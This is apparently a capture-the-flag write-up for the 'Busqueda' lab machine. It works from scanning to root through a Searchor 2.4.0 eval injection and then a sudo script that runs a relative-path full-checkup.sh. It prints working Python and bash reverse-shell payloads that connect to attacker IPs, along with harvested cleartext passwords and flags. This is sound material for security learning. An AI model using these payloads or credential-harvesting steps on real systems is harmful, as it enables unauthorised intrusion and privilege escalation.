# Overview

## Footprinting:
```
nmap -sV -A -p- 10.10.11.208 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-15 20:59 EDT
Nmap scan report for 10.10.11.208
Host is up (0.034s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.38 seconds
```

## Initial foothold:

Enumerating existing folders and directories on the web application:
```
dirb http://searcher.htb/  

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon May 15 21:06:35 2023
URL_BASE: http://searcher.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://searcher.htb/ ----
+ http://searcher.htb/search (CODE:405|SIZE:153)                                      
+ http://searcher.htb/server-status (CODE:403|SIZE:277)                               
                                                                                      
-----------------
END_TIME: Mon May 15 21:08:54 2023
DOWNLOADED: 4612 - FOUND: 2
```

Not much information, but we can focus on the /search endpoint by testing the behavior of the web application. We are able to select an engine and search for a keyword with or without the Auto redirection option.
```http
POST /search HTTP/1.1
Host: searcher.htb
Content-Length: 47
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://searcher.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://searcher.htb/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

engine=Amazon&query=GetSomething&auto_redirect=
```

The software versions are listed in the footer of the page:
```
Powered by [Flask](https://flask.palletsprojects.com) and [Searchor 2.4.0](https://github.com/ArjunSharda/Searchor)
```

The current version of Searchor is vulnerable to code execution since there is an unsafe eval usage:
https://security.snyk.io/vuln/SNYK-PYTHON-SEARCHOR-3166303
https://github.com/ArjunSharda/Searchor/commit/29d5b1f28d29d6a282a5e860d456fab2df24a16b

Searching for proof of concept exploits on GitHub:
https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-
https://github.com/jonnyzar/POC-Searchor-2.4.2

We can now generate a payload with our values:
```
', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.15',1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#
```

Starting up a listener on the attacker machine:
```
nc -nlvp 1234
```

With a proxy, we can intercept the POST request and enter the payload for the unsanitized query parameter:
```http
POST /search HTTP/1.1
Host: searcher.htb
Content-Length: 253
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://searcher.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://searcher.htb/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

engine=Accuweather&query=', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.44',1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#
```

The reverse connection is established:
```
nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.11.208] 46278
/bin/sh: 0: can't access tty; job control turned off

$ whoami
svc
```

Upgrading the basic shell to be interactive:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Getting the user flag:
```
svc@busqueda:~$ cd ~ 

svc@busqueda:~$ ls -l

total 8
drwx------ 3 svc  svc 4096 May 25 17:46 snap
-rw-r----- 1 root svc   33 May 25 17:30 user.txt

svc@busqueda:~$ cat user.txt
a58f4415be42b3e7c7526fd1b7b84f7f
```

## Privilege escalation:

We now need to enumerate the system locally to move laterally or elevate our privileges.

We are not able to list sudo commands since we do not have the password for the service account:
```
svc@busqueda:/var/www/app$ sudo -l

[sudo] password for svc:
```

Within the application directory, there is a hidden .git directory:
```
svc@busqueda:/var/www/app$ ls -la

total 20
drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 .
drwxr-xr-x 4 root     root     4096 Apr  4 16:02 ..
-rw-r--r-- 1 www-data www-data 1124 Dec  1 14:22 app.py
drwxr-xr-x 8 www-data www-data 4096 May 25 17:30 .git
drwxr-xr-x 2 www-data www-data 4096 Dec  1 14:35 templates

svc@busqueda:/var/www/app/.git$ ls -la

total 52
drwxr-xr-x 8 www-data www-data 4096 May 25 17:30 .
drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 ..
drwxr-xr-x 2 www-data www-data 4096 Dec  1 14:35 branches
-rw-r--r-- 1 www-data www-data   15 Dec  1 14:35 COMMIT_EDITMSG
-rw-r--r-- 1 www-data www-data  294 Dec  1 14:35 config
-rw-r--r-- 1 www-data www-data   73 Dec  1 14:35 description
-rw-r--r-- 1 www-data www-data   21 Dec  1 14:35 HEAD
drwxr-xr-x 2 www-data www-data 4096 Dec  1 14:35 hooks
-rw-r--r-- 1 root     root      259 Apr  3 15:09 index
drwxr-xr-x 2 www-data www-data 4096 Dec  1 14:35 info
drwxr-xr-x 3 www-data www-data 4096 Dec  1 14:35 logs
drwxr-xr-x 9 www-data www-data 4096 Dec  1 14:35 objects
drwxr-xr-x 5 www-data www-data 4096 Dec  1 14:35 refs
```

From the logs, we know that the user administrator@gitea.searcher.htb exists:
```
svc@busqueda:/var/www/app/.git$ cd logs

svc@busqueda:/var/www/app/.git/logs$ ls -l

total 8
-rw-r--r-- 1 www-data www-data  181 Apr  3 14:32 HEAD
drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:33 refs

svc@busqueda:/var/www/app/.git/logs$ cat HEAD

0000000000000000000000000000000000000000 5ede9ed9f2ee636b5eb559fdedfd006d2eae86f4 administrator <administrator@gitea.searcher.htb> 1671970461 +0000 commit (initial): Initial commit
```

From the config file, there is also clear text credential for the user cody:
```
svc@busqueda:/var/www/app/.git$ cat config

[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
```

There is most likely a local Gitea instance installed on the system. Adding local DNS entry on the attacker machine to make sure we can resolve the subdomain correctly:
```
vim /etc/hosts

cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.10.11.208    searcher.htb
10.10.11.208    gitea.searcher.htb

ping gitea.searcher.htb   
PING gitea.searcher.htb (10.10.11.208) 56(84) bytes of data.
64 bytes from searcher.htb (10.10.11.208): icmp_seq=1 ttl=63 time=21.2 ms
64 bytes from searcher.htb (10.10.11.208): icmp_seq=2 ttl=63 time=22.1 ms
```

We can login into Gitea, but where is not much more information. We can try to reuse cody's password for the service account:
```
svc@busqueda:/var/www/app$ sudo -l

[sudo] password for svc: jh1usoih2bkjaspwe92

Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

The system-checkup.py script is not readable, but the usage is displayed when executed:
```
svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py id
< /usr/bin/python3 /opt/scripts/system-checkup.py id
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

Testing the behavior of the three actions:
```
svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps

CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS       PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   4 months ago   Up 4 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   4 months ago   Up 4 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db

svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect

Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>

svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup

Something went wrong
```

The first option lists the current state of the containers.

The second option queries attributes of the container's configuration.

The third option failed without any verbose output.

Checking the documentation for the docker-inspect (second option):
https://docs.docker.com/engine/reference/commandline/inspect/

We can dump the configuration data of the container, which contains clear text credentials:
```
svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' gitea
<-checkup.py docker-inspect '{{json .Config}}' gitea
{"Hostname":"960873171e2e","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"22/tcp":{},"3000/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["USER_UID=115","USER_GID=121","GITEA__database__DB_TYPE=mysql","GITEA__database__HOST=db:3306","GITEA__database__NAME=gitea","GITEA__database__USER=gitea","GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","USER=git","GITEA_CUSTOM=/data/gitea"],"Cmd":["/bin/s6-svscan","/etc/s6"],"Image":"gitea/gitea:latest","Volumes":{"/data":{},"/etc/localtime":{},"/etc/timezone":{}},"WorkingDir":"","Entrypoint":["/usr/bin/entrypoint"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"server","com.docker.compose.version":"1.29.2","maintainer":"maintainers@gitea.io","org.opencontainers.image.created":"2022-11-24T13:22:00Z","org.opencontainers.image.revision":"9bccc60cf51f3b4070f5506b042a3d9a1442c73d","org.opencontainers.image.source":"https://github.com/go-gitea/gitea.git","org.opencontainers.image.url":"https://github.com/go-gitea/gitea"}}
```

We are able to login as administrator on Gitea with the leaked password (yuiu1hoiu4i5ho1uh). 

We now have visibility on specific commits regarding the administrative scripts located in /opt/scripts.

The content of the system-checkup.py is now viewable:
```python
import subprocess
import sys

actions = ['full-checkup', 'docker-ps','docker-inspect']

def run_command(arg_list):
    r = subprocess.run(arg_list, capture_output=True)
    if r.stderr:
        output = r.stderr.decode()
    else:
        output = r.stdout.decode()

    return output


def process_action(action):
    if action == 'docker-inspect':
        try:
            _format = sys.argv[2]
            if len(_format) == 0:
                print(f"Format can't be empty")
                exit(1)
            container = sys.argv[3]
            arg_list = ['docker', 'inspect', '--format', _format, container]
            print(run_command(arg_list)) 
        
        except IndexError:
            print(f"Usage: {sys.argv[0]} docker-inspect <format> <container_name>")
            exit(1)
    
        except Exception as e:
            print('Something went wrong')
            exit(1)
    
    elif action == 'docker-ps':
        try:
            arg_list = ['docker', 'ps']
            print(run_command(arg_list)) 
        
        except:
            print('Something went wrong')
            exit(1)

    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
            

if __name__ == '__main__':

    try:
        action = sys.argv[1]
        if action in actions:
            process_action(action)
        else:
            raise IndexError

    except IndexError:
        print(f'Usage: {sys.argv[0]} <action> (arg1) (arg2)')
        print('')
        print('     docker-ps     : List running docker containers')
        print('     docker-inspect : Inpect a certain docker container')
        print('     full-checkup  : Run a full system checkup')
        print('')
        exit(1)
```

The first two options will launch native docker commands built from an argument list.

The third option is failing since it is trying to launch the full-checkup.sh script in the current directory while the actual file is stored in /opt/scripts. 

It means that we can craft a malicious reverse shell script and execute it instead of the legitimate one:
```
vim full-checkup.sh

#!/bin/bash
/bin/bash -l > /dev/tcp/10.10.14.44/1235 0<&1 2>&1

chmod +x full-checkup.sh
```

Starting the listener on the attacker machine:
```
nc -nlvp 12345
```

Launching the script with root privileges:
```
svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

The reverse shell script gets executed with elevated privileges:
```
connect to [10.10.14.44] from (UNKNOWN) [10.10.11.208] 45454
whoami
root

hostname
busqueda

cd /root

ls -l
total 16
-rw-r----- 1 root root  430 Apr  3 15:13 ecosystem.config.js
-rw-r----- 1 root root   33 May 25 22:15 root.txt
drwxr-xr-x 4 root root 4096 Apr  3 16:01 scripts
drwx------ 3 root root 4096 Mar  1 10:46 snap

cat root.txt
51e2dc15892e1e05d75ec51f864bf43f
```